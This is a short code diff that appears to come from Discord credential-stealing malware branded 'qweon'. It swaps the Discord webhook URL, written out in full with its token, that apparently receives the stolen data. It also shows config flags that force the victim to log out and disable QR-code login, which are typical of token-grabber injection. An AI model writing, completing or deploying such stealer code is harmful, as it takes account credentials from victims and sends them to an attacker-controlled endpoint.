@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "qweon",
 
-    webhook: "https://discord.com/api/webhooks/1198768438554931370/9cKvsp0vqhzS8Agh-3YP-anAUxT4ESH8KfiOBfLmU01lSX0I50kkunT7lbW4FSQoZEsn",
+    webhook: "https://discord.com/api/webhooks/1198799976063565916/bUm4-S7qHQMxey5MomlvI30eSD2DQF14ArbJ9vWc_bgVctyymYFbmJNaqcUhFOy7aMaH",
 
     logout: true,
     disable_qr_code: true,
